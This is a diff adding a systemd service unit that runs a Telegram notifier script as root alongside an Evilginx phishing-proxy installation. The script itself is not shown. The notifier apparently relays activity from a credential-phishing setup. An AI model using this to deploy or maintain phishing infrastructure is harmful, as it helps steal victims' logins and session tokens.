@@ -1,0 +1,18 @@
+[Unit]
+Description=Evilginx Telegram Notifier
+After=network.target evilginx.service
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/opt/evilginx-pro-collection
+ExecStart=/opt/evilginx-pro-collection/.venv/bin/python /opt/evilginx-pro-collection/scripts/telegram_notifier.py
+Restart=always
+RestartSec=10
+StandardOutput=journal
+StandardError=journal
+SyslogIdentifier=telegram_notifier
+Environment="PYTHONUNBUFFERED=1"
+
+[Install]
+WantedBy=multi-user.target
